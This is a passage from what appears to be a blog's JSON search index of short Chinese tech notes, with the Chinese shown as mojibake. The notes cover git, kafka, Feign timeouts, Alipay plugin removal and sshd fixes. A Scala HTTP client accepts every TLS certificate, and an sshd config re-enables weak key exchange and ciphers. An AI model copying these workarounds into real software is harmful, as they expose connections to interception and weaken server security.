&quot;/usr/lib/python2.7/dist-packages/OpenSSL/__init__.py&quot;, line 8, in &lt;module&gt; from OpenSSL import rand, crypto, SSL File &quot;/usr/lib/python2.7/dist-packages/OpenSSL/SSL.py&quot;, line 118, in &lt;module&gt; SSL_ST_INIT = _lib.SSL_ST_INITAttributeError: &apos;module&apos; object has no attribute &apos;SSL_ST_INIT&apos;è§£å†³ï¼š123rm -rf /usr/lib/python2.7/dist-packages/OpenSSLrm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-infosudo pip install pyopenssl","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Chromeå¶ç„¶net::ERR_CERT_DATABASE_CHANGEDï¼Œ","slug":"history/tech/5ba1ac4fae2eaa9c4e941ab0","date":"2018-09-19T01:54:23.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba1ac4fae2eaa9c4e941ab0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba1ac4fae2eaa9c4e941ab0/","excerpt":"","text":"1sudo rm -rf /Library/Application\\ Support/Alipay &amp;&amp; rm -rf /Library/LaunchDaemons/com.alipay.DispatcherService.plist &amp;&amp; rm -rf ~/Library/LaunchAgents/com.alipay.adaptor.plist &amp;&amp; rm -rf ~/Library/LaunchAgents/com.alipay.refresher.plist &amp;&amp; rm -rf ~/Library/Internet\\ Plug-Ins/aliedit.plugin &amp;&amp; rm -rf ~/Library/Internet\\ Plug-Ins/npalicdo.plugin","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"Spring Cloud Feign è¶…æ—¶è®¾ç½®å°è®¡","slug":"history/tech/5ba0cde5ae2eaa9c4e941aaf","date":"2018-09-17T22:05:25.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba0cde5ae2eaa9c4e941aaf/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba0cde5ae2eaa9c4e941aaf/","excerpt":"","text":"12345678è®¾ç½®æ‰€æœ‰çš„å¾®æœåŠ¡ è¶…æ—¶é…ç½®feign: client: config: default: connectTimeout: 50000 readTimeout: 50000 loggerLevel: basic12345678å•ç‹¬è®¾ç½®æŸä¸ªå¾®æœåŠ¡çš„è¶…æ—¶é…ç½®feign: client: config: server-A: # è®¾å®šserver-A æœåŠ¡è°ƒç”¨çš„è¶…æ—¶è®¾ç½® connectTimeout: 50000 readTimeout: 50000 loggerLevel: basic1234å¦‚æœä»¥ä¸Šéƒ½æ²¡æœ‰è®¾ç½®æ­£ç¡®ï¼Œè®¾ç½®Ribbon çš„è¶…æ—¶é…ç½®ä¹Ÿæ˜¯ç”Ÿæ•ˆçš„ã€‚å› ä¸ºFeign åº•å±‚è¿˜æ˜¯ä½¿ç”¨Ribbon è´Ÿè½½è°ƒç”¨æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒçš„å¾®æœåŠ¡çš„ã€‚ribbon: ReadTimeout: 50000 ConnectTimeout: 50000","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"ansible ç»ˆç«¯åˆ‡æ¢ç”¨æˆ·æ‰§è¡Œå‘½ä»¤","slug":"history/tech/5ba0b2bbae2eaa9c4e941aae","date":"2018-09-17T20:09:31.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba0b2bbae2eaa9c4e941aae/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba0b2bbae2eaa9c4e941aae/","excerpt":"","text":"1ansible hostA -S -R remoteUser -m shell -a &quot;pm2 l&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mongodb setFeatureCompatibilityVersion","slug":"history/tech/5ba0aa90ae2eaa9c4e941aad","date":"2018-09-17T19:34:40.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba0aa90ae2eaa9c4e941aad/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba0aa90ae2eaa9c4e941aad/","excerpt":"","text":"1db.adminCommand( &#123; setFeatureCompatibilityVersion: &quot;3.4&quot; &#125; )","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Spring boot 2.0 å‡çº§ jpa AbstractUUIDGenerator  å®ç°æ”¹åŠ¨","slug":"history/tech/5ba0939eae2eaa9c4e941aac","date":"2018-09-17T17:56:46.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba0939eae2eaa9c4e941aac/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba0939eae2eaa9c4e941aac/","excerpt":"","text":"123456789101112// public Serializable generate(SessionImplementor session, Object obj) &#123;//// SnowFlake snowFlake = new SnowFlake(machineId);// String id = this.tablePrefix + Long.toString(snowFlake.nextId());// return id;// &#125; @Override public Serializable generate(SharedSessionContractImplementor session, Object object) throws HibernateException &#123; String id = this.tablePrefix + Long.toString(snowFlake.nextId()); return id; &#125;2.0 ä¸€ä¸‹ç‰ˆæœ¬ä½¿ç”¨ä¼šæŠ¥é”™ã€‚ç”±äºgenerateçš„å‚æ•°å˜åŒ–äº†ï¼Œæ‰€ä»¥åœ¨åŠ¨æ€åŠ è½½å‡½æ•°çš„æ—¶å€™ java.lang.AbstractMethodError: *.model.entity.KeyUtils.generate(Lorg/hibernate/engine/spi/SharedSessionContractImplementor;Ljava/lang/Object;)Ljava/io/Serializable;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"Git å¸¸ç”¨å‘½ä»¤å¤§å…¨","slug":"history/tech/5ba092d9ae2eaa9c4e941aab","date":"2018-09-17T17:53:29.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba092d9ae2eaa9c4e941aab/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba092d9ae2eaa9c4e941aab/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586git init # åˆå§‹åŒ–æœ¬åœ°gitä»“åº“ï¼ˆåˆ›å»ºæ–°ä»“åº“ï¼‰git config --global user.name &quot;xxx&quot; # é…ç½®ç”¨æˆ·ågit config --global user.email &quot;xxx@xxx.com&quot; # é…ç½®é‚®ä»¶git config --global color.ui true # git statusç­‰å‘½ä»¤è‡ªåŠ¨ç€è‰²git config --global color.status autogit config --global color.diff autogit config --global color.branch autogit config --global color.interactive autogit config --global --unset http.proxy # remove proxy configuration on gitgit clone git+ssh://git@192.168.1.2/VT.git # cloneè¿œç¨‹ä»“åº“git status # æŸ¥çœ‹å½“å‰ç‰ˆæœ¬çŠ¶æ€ï¼ˆæ˜¯å¦ä¿®æ”¹ï¼‰git add xyz # æ·»åŠ xyzæ–‡ä»¶è‡³indexgit add . # å¢åŠ å½“å‰å­ç›®å½•ä¸‹æ‰€æœ‰æ›´æ”¹è¿‡çš„æ–‡ä»¶è‡³indexgit commit -m &apos;xxx&apos; # æäº¤git commit --amend -m &apos;xxx&apos; # åˆå¹¶ä¸Šä¸€æ¬¡æäº¤ï¼ˆç”¨äºåå¤ä¿®æ”¹ï¼‰git commit -am &apos;xxx&apos; # å°†addå’Œcommitåˆä¸ºä¸€æ­¥git rm xxx # åˆ é™¤indexä¸­çš„æ–‡ä»¶git rm -r * # é€’å½’åˆ é™¤git log # æ˜¾ç¤ºæäº¤æ—¥å¿—git log -1 # æ˜¾ç¤º1è¡Œæ—¥å¿— -nä¸ºnè¡Œgit log -5git log --stat # æ˜¾ç¤ºæäº¤æ—¥å¿—åŠç›¸å…³å˜åŠ¨æ–‡ä»¶git log -p -mgit show dfb02e6e4f2f7b573337763e5c0013802e392818 # æ˜¾ç¤ºæŸä¸ªæäº¤çš„è¯¦ç»†å†…å®¹git show dfb02 # å¯åªç”¨commitidçš„å‰å‡ ä½git show HEAD # æ˜¾ç¤ºHEADæäº¤æ—¥å¿—git show HEAD^ # æ˜¾ç¤ºHEADçš„çˆ¶ï¼ˆä¸Šä¸€ä¸ªç‰ˆæœ¬ï¼‰çš„æäº¤æ—¥å¿— ^^ä¸ºä¸Šä¸¤ä¸ªç‰ˆæœ¬ ^5ä¸ºä¸Š5ä¸ªç‰ˆæœ¬git tag # æ˜¾ç¤ºå·²å­˜åœ¨çš„taggit tag -a v2.0 -m &apos;xxx&apos; # å¢åŠ v2.0çš„taggit show v2.0 # æ˜¾ç¤ºv2.0çš„æ—¥å¿—åŠè¯¦ç»†å†…å®¹git log v2.0 # æ˜¾ç¤ºv2.0çš„æ—¥å¿—git diff # æ˜¾ç¤ºæ‰€æœ‰æœªæ·»åŠ è‡³indexçš„å˜æ›´git diff --cached # æ˜¾ç¤ºæ‰€æœ‰å·²æ·»åŠ indexä½†è¿˜æœªcommitçš„å˜æ›´git diff HEAD^ # æ¯”è¾ƒä¸ä¸Šä¸€ä¸ªç‰ˆæœ¬çš„å·®å¼‚git diff HEAD -- ./lib # æ¯”è¾ƒä¸HEADç‰ˆæœ¬libç›®å½•çš„å·®å¼‚git diff origin/master..master # æ¯”è¾ƒè¿œç¨‹åˆ†æ”¯masterä¸Šæœ‰æœ¬åœ°åˆ†æ”¯masterä¸Šæ²¡æœ‰çš„git diff origin/master..master --stat # åªæ˜¾ç¤ºå·®å¼‚çš„æ–‡ä»¶ï¼Œä¸æ˜¾ç¤ºå…·ä½“å†…å®¹git remote add origin git+ssh://git@192.168.1.2/VT.git # å¢åŠ è¿œç¨‹å®šä¹‰ï¼ˆç”¨äºpush/pull/fetchï¼‰git branch # æ˜¾ç¤ºæœ¬åœ°åˆ†æ”¯git branch --contains 50089 # æ˜¾ç¤ºåŒ…å«æäº¤50089çš„åˆ†æ”¯git branch -a # æ˜¾ç¤ºæ‰€æœ‰åˆ†æ”¯git branch -r # æ˜¾ç¤ºæ‰€æœ‰åŸåˆ›åˆ†æ”¯git branch --merged # æ˜¾ç¤ºæ‰€æœ‰å·²åˆå¹¶åˆ°å½“å‰åˆ†æ”¯çš„åˆ†æ”¯git branch --no-merged # æ˜¾ç¤ºæ‰€æœ‰æœªåˆå¹¶åˆ°å½“å‰åˆ†æ”¯çš„åˆ†æ”¯git branch -m master master_copy # æœ¬åœ°åˆ†æ”¯æ”¹ågit checkout -b master_copy # ä»å½“å‰åˆ†æ”¯åˆ›å»ºæ–°åˆ†æ”¯master_copyå¹¶æ£€å‡ºgit checkout -b master master_copy # ä¸Šé¢çš„å®Œæ•´ç‰ˆgit checkout features/performance # æ£€å‡ºå·²å­˜åœ¨çš„features/performanceåˆ†æ”¯git checkout --track hotfixes/BJVEP933 # æ£€å‡ºè¿œç¨‹åˆ†æ”¯hotfixes/BJVEP933å¹¶åˆ›å»ºæœ¬åœ°è·Ÿè¸ªåˆ†æ”¯git checkout v2.0 # æ£€å‡ºç‰ˆæœ¬v2.0git checkout -b devel origin/develop # ä»è¿œç¨‹åˆ†æ”¯developåˆ›å»ºæ–°æœ¬åœ°åˆ†æ”¯develå¹¶æ£€å‡ºgit checkout -- README # æ£€å‡ºheadç‰ˆæœ¬çš„READMEæ–‡ä»¶ï¼ˆå¯ç”¨äºä¿®æ”¹é”™è¯¯å›é€€ï¼‰git merge origin/master # åˆå¹¶è¿œç¨‹masteråˆ†æ”¯è‡³å½“å‰åˆ†æ”¯git cherry-pick ff44785404a8e # åˆå¹¶æäº¤ff44785404a8eçš„ä¿®æ”¹git push origin master # å°†å½“å‰åˆ†æ”¯pushåˆ°è¿œç¨‹masteråˆ†æ”¯git push origin :hotfixes/BJVEP933 # åˆ é™¤è¿œç¨‹ä»“åº“çš„hotfixes/BJVEP933åˆ†æ”¯git push --tags # æŠŠæ‰€æœ‰tagæ¨é€åˆ°è¿œç¨‹ä»“åº“git fetch # è·å–æ‰€æœ‰è¿œç¨‹åˆ†æ”¯ï¼ˆä¸æ›´æ–°æœ¬åœ°åˆ†æ”¯ï¼Œå¦éœ€mergeï¼‰git fetch --prune # è·å–æ‰€æœ‰åŸåˆ›åˆ†æ”¯å¹¶æ¸…é™¤æœåŠ¡å™¨ä¸Šå·²åˆ æ‰çš„åˆ†æ”¯git pull origin master # è·å–è¿œç¨‹åˆ†æ”¯masterå¹¶mergeåˆ°å½“å‰åˆ†æ”¯git mv README README2 # é‡å‘½åæ–‡ä»¶READMEä¸ºREADME2git reset --hard HEAD # å°†å½“å‰ç‰ˆæœ¬é‡ç½®ä¸ºHEADï¼ˆé€šå¸¸ç”¨äºmergeå¤±è´¥å›é€€ï¼‰git rebasegit branch -d hotfixes/BJVEP933 # åˆ é™¤åˆ†æ”¯hotfixes/BJVEP933ï¼ˆæœ¬åˆ†æ”¯ä¿®æ”¹å·²åˆå¹¶åˆ°å…¶ä»–åˆ†æ”¯ï¼‰git branch -D hotfixes/BJVEP933 # å¼ºåˆ¶åˆ é™¤åˆ†æ”¯hotfixes/BJVEP933git ls-files # åˆ—å‡ºgit indexåŒ…å«çš„æ–‡ä»¶git show-branch # å›¾ç¤ºå½“å‰åˆ†æ”¯å†å²git show-branch --all # å›¾ç¤ºæ‰€æœ‰åˆ†æ”¯å†å²git whatchanged # æ˜¾ç¤ºæäº¤å†å²å¯¹åº”çš„æ–‡ä»¶ä¿®æ”¹git revert dfb02e6e4f2f7b573337763e5c0013802e392818 # æ’¤é”€æäº¤dfb02e6e4f2f7b573337763e5c0013802e392818git ls-tree HEAD # å†…éƒ¨å‘½ä»¤ï¼šæ˜¾ç¤ºæŸä¸ªgitå¯¹è±¡git rev-parse v2.0 # å†…éƒ¨å‘½ä»¤ï¼šæ˜¾ç¤ºæŸä¸ªrefå¯¹äºçš„SHA1 HASHgit reflog # æ˜¾ç¤ºæ‰€æœ‰æäº¤ï¼ŒåŒ…æ‹¬å­¤ç«‹èŠ‚ç‚¹git show HEAD@&#123;5&#125;git show master@&#123;yesterday&#125; # æ˜¾ç¤ºmasteråˆ†æ”¯æ˜¨å¤©çš„çŠ¶æ€git log --pretty=format:&apos;%h %s&apos; --graph # å›¾ç¤ºæäº¤æ—¥å¿—git show HEAD~3git show -s --pretty=raw 2be7fcb476git stash # æš‚å­˜å½“å‰ä¿®æ”¹ï¼Œå°†æ‰€æœ‰è‡³ä¸ºHEADçŠ¶æ€git stash list # æŸ¥çœ‹æ‰€æœ‰æš‚å­˜git stash show -p stash@&#123;0&#125; # å‚è€ƒç¬¬ä¸€æ¬¡æš‚å­˜git stash apply stash@&#123;0&#125; # åº”ç”¨ç¬¬ä¸€æ¬¡æš‚å­˜git grep &quot;delete from&quot; # æ–‡ä»¶ä¸­æœç´¢æ–‡æœ¬â€œdelete fromâ€git grep -e &apos;#define&apos; --and -e SORT_DIRENTgit gcgit fsck","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"Git","slug":"Git","permalink":"https://wangxiuwen.github.io/tags/Git/"}],"author":"baipeng"},{"title":"kafka å¸¸ç”¨æ“ä½œ","slug":"history/tech/5b9f2178ae2eaa9c4e941aa7","date":"2018-09-17T03:37:28.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b9f2178ae2eaa9c4e941aa7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b9f2178ae2eaa9c4e941aa7/","excerpt":"","text":"1234/usr/local/kafka/kafka_2.12-1.0.1/bin/kafka-topics.sh --list --zookeeper localhost:2181/kafka/usr/local/kafka/kafka_2.12-1.0.1/bin/kafka-consumer-groups.sh --bootstrap-server localhost:9092 --describe --group foo/usr/local/kafka/kafka_2.12-1.0.1/bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic xxx --from-beginning/usr/local/kafka/kafka_2.12-1.0.1/bin/kafka-console-producer.sh --broker-list localhost:9092 --topic xxx","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"scala ä½¿ç”¨ org.apache.http 4.5.2 è®¿é—® https åœ°å€å¿½ç•¥è¯ä¹¦","slug":"history/tech/5b9fbef3ae2eaa9c4e941aa8","date":"2018-09-17T02:49:23.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b9fbef3ae2eaa9c4e941aa8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b9fbef3ae2eaa9c4e941aa8/","excerpt":"","text":"é—®é¢˜ï¼š1Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested targetåŸå› :æˆ‘ä»¬åªèƒ½æ‰¾åˆ°CAæœºæ„çš„æŒ‡çº¹ï¼Œè€Œæ‰¾ä¸åˆ°ä¸­é—´è¯ä¹¦çš„æŒ‡çº¹ï¼Œæ‰€ä»¥åœ¨Javaä¸­æ— æ³•éªŒè¯æ•´æ¡è¯ä¹¦é“¾çš„æœ‰æ•ˆæ€§ï¼Œæ‰€ä»¥å¯¼è‡´Javaç¨‹åºåœ¨é€šè¿‡HTTPSåè®®è®¿é—®æµè§ˆå™¨è®¿é—®æ­£å¸¸çš„åŸŸåæ—¶å‘ç”Ÿè¯ä¹¦é”™è¯¯ã€‚é€šå¸¸çš„è§£å†³åŠæ³•æ˜¯åœ¨Http Clientç«¯è®¾ç½®å¿½ç•¥è¯ä¹¦é”™è¯¯ï¼Œæˆ–æ˜¯å°†ç¼ºå°‘çš„ä¸­é—´è¯ä¹¦å¯¼å…¥Java keystoreæ’æ›²ï¼šHttpclient SSLContextBuilder deprecatedåŸå› ï¼šSSLContextBuilderä»åŸæ¥çš„org.apache.http.conn.ssl åŒ…æŒªåˆ°äº†org.apache.http.ssl åŒ…ä»£ç ï¼š123456789101112131415161718def createSSLClientDefault: CloseableHttpClient = &#123; try &#123; val sslContext = new SSLContextBuilder().loadTrustMaterial(null, new TrustStrategy &#123; override def isTrusted(x509Certificates: Array[X509Certificate], s: String): Boolean = true &#125;).build() val sslsf = new SSLConnectionSocketFactory(sslContext) return HttpClients.custom.setSSLSocketFactory(sslsf).build &#125; catch &#123; case e: KeyManagementException =&gt; LOGGER.error(e.getMessage, e) case e: NoSuchAlgorithmException =&gt; LOGGER.error(e.getMessage, e) case e: KeyStoreException =&gt; LOGGER.error(e.getMessage, e) &#125; HttpClients.createDefault&#125;å®Œæ•´ä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198import java.io.IOExceptionimport java.net.URLEncoderimport java.security.cert.X509Certificateimport java.security.&#123;KeyManagementException, KeyStoreException, NoSuchAlgorithmException&#125;import java.utilimport com.alibaba.fastjson.JSON.toJSONStringimport com.google.common.base.Preconditionsimport com.google.common.collect.&#123;ImmutableMap, Lists&#125;import org.apache.http.client.ResponseHandlerimport org.apache.http.client.config.RequestConfigimport org.apache.http.client.entity.UrlEncodedFormEntityimport org.apache.http.client.methods.&#123;HttpGet, HttpPost&#125;import org.apache.http.conn.ssl.&#123;SSLConnectionSocketFactory, TrustStrategy&#125;import org.apache.http.impl.client.&#123;CloseableHttpClient, HttpClients&#125;import org.apache.http.message.BasicNameValuePairimport org.apache.http.ssl.SSLContextBuilderimport org.apache.http.util.EntityUtilsimport org.apache.http.&#123;Consts, HttpResponse, NameValuePair&#125;import org.slf4j.&#123;Logger, LoggerFactory&#125;/** * */object HttpClientUtils &#123; private val LOGGER: Logger = LoggerFactory.getLogger(HttpClientUtils.getClass) private val CONNECTION_REQUEST_TIMEOUT = 10000 private val SOCKET_TIMEOUT = 10000 private val defaultRequestConfig = RequestConfig.custom .setSocketTimeout(SOCKET_TIMEOUT) .setConnectionRequestTimeout(CONNECTION_REQUEST_TIMEOUT) .setConnectTimeout(CONNECTION_REQUEST_TIMEOUT) .build def createSSLClientDefault: CloseableHttpClient = &#123; try &#123; val sslContext = new SSLContextBuilder().loadTrustMaterial(null, new TrustStrategy &#123; override def isTrusted(x509Certificates: Array[X509Certificate], s: String): Boolean = true &#125;).build() val sslsf = new SSLConnectionSocketFactory(sslContext) return HttpClients.custom.setSSLSocketFactory(sslsf).build &#125; catch &#123; case e: KeyManagementException =&gt; LOGGER.error(e.getMessage, e) case e: NoSuchAlgorithmException =&gt; LOGGER.error(e.getMessage, e) case e: KeyStoreException =&gt; LOGGER.error(e.getMessage, e) &#125; HttpClients.createDefault &#125; /** * get è¯·æ±‚ * * @param url * @param keys * @param enc * @return */ def get(url: String, keys: Map[String, String] = Map(), enc: String = Consts.UTF_8.name()): String = &#123; Preconditions.checkNotNull(url) var client: CloseableHttpClient = null var returnStr: String = null; try &#123; //client = HttpClients.createDefault() client = createSSLClientDefault var sb: StringBuilder = new StringBuilder(url) if (keys != null &amp;&amp; !keys.isEmpty) &#123; import scala.collection.JavaConversions._ for (entry &lt;- keys.entrySet()) &#123; if (sb.indexOf(&quot;?&quot;) == -1) &#123; sb.append(&quot;?&quot;) sb.append(URLEncoder.encode(entry.getKey, enc)) sb.append(&quot;=&quot;) sb.append(URLEncoder.encode(entry.getValue, enc)) &#125; else &#123; sb.append(&quot;&amp;&quot;) sb.append(URLEncoder.encode(entry.getKey, enc)) sb.append(&quot;=&quot;) sb.append(URLEncoder.encode(entry.getValue, enc)) &#125; &#125; &#125; val responseHandler = getDefaultHandler LOGGER.info(sb.toString + &quot;=====&quot;) val httpget = new HttpGet(sb.toString) httpget.setConfig(defaultRequestConfig) returnStr = client.execute(httpget, responseHandler) &#125; catch &#123; case e: Exception =&gt; &#123; LOGGER.error(e.getMessage, e) &#125; &#125; finally &#123; closeClient(client) &#125; returnStr &#125; /** * POST è¯·æ±‚ formæäº¤ * * @param url * @param keys * @param enc * @return */ def post(url: String, keys: Map[String, String] = Map(), enc: String = Consts.UTF_8.name()): String = &#123; Preconditions.checkNotNull(url) var returnStr: String = null var client: CloseableHttpClient = null try &#123; //client = HttpClients.createDefault() client = createSSLClientDefault val httpPost: HttpPost = new HttpPost(url) httpPost.setConfig(defaultRequestConfig) if (keys != null &amp;&amp; !keys.isEmpty) &#123; val formParams: util.List[NameValuePair] = Lists.newArrayListWithExpectedSize(keys.size) import scala.collection.JavaConversions._ for (entry &lt;- keys.entrySet) &#123; formParams.add(new BasicNameValuePair(entry.getKey, entry.getValue)) &#125; val entity: UrlEncodedFormEntity = new UrlEncodedFormEntity(formParams, enc) httpPost.setEntity(entity) &#125; val responseHandler: ResponseHandler[String] = getDefaultHandler returnStr = client.execute(httpPost, responseHandler) &#125; catch &#123; case e: Exception =&gt; LOGGER.error(e.getMessage, e) &#125; finally closeClient(client) returnStr &#125; /** * POST è¯·æ±‚ application/json æäº¤ * * @param url * @param data * @param enc * @return */ def postJsonStr(url: String, data: String, enc: String = Consts.UTF_8.name()): String = &#123; Preconditions.checkNotNull(url) Preconditions.checkNotNull(data) var returnStr: String = null var client: CloseableHttpClient = null try &#123; //client = HttpClients.createDefault() client = createSSLClientDefault val httpPost: HttpPost = new HttpPost(url) httpPost.setConfig(defaultRequestConfig) import org.apache.http.entity.StringEntity val entity = new StringEntity(data, enc) entity.setContentType(&quot;application/json&quot;) httpPost.setEntity(entity) val responseHandler: ResponseHandler[String] = getDefaultHandler returnStr = client.execute(httpPost, responseHandler) &#125; catch &#123; case e: Exception =&gt; LOGGER.error(e.getMessage, e) &#125; finally closeClient(client) returnStr &#125; private def getDefaultHandler = new ResponseHandler[String]() &#123; @throws[IOException] override def handleResponse(response: HttpResponse): String = &#123; val entity = response.getEntity val returnStr = if (entity != null) EntityUtils.toString(entity) else null EntityUtils.consumeQuietly(entity) returnStr &#125; &#125; private def closeClient(client: CloseableHttpClient): Unit = &#123; if (client != null) try client.close() catch &#123; case e: IOException =&gt; LOGGER.error(e.getMessage, e) &#125; &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"warning setlocale LC_CTYPE cannot change locale (zh_CN.UTF-8)","slug":"history/tech/5b9a4b7eae2eaa9c4e941aa6","date":"2018-09-12T23:35:26.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b9a4b7eae2eaa9c4e941aa6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b9a4b7eae2eaa9c4e941aa6/","excerpt":"","text":"æŠ¥é”™ï¼š1warning: setlocale: LC_CTYPE: cannot change locale (zh_CN.UTF-8)è§£å†³ï¼š123vim /etc/locale.gen# å–æ¶ˆæ³¨é‡Šzh_CN.UTF-8 UTF-8æ‰§è¡Œï¼š1locale-gen","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"80070007 SSH Tunnel Server does not support diffie-hellman-group1-sha1 for keyexchange","slug":"history/tech/5b9a093dae2eaa9c4e941aa5","date":"2018-09-12T18:52:45.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b9a093dae2eaa9c4e941aa5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b9a093dae2eaa9c4e941aa5/","excerpt":"","text":"æŠ¥é”™ï¼š180070007: SSH Tunnel: Server does not support diffie-hellman-group1-sha1 for keyexchangeè§£å†³:123vim /etc/ssh/sshd_configKexAlgorithms diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1Ciphers 3des-cbc,blowfish-cbc,aes128-cbc,aes128-ctr,aes256-ctr12ssh-keygen -Aservice ssh restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Spring Boot  2.0.2 druidç”¨çš„æ˜¯1.1.9 é›†æˆæ—¶  æ³¨æ„filtersçš„ 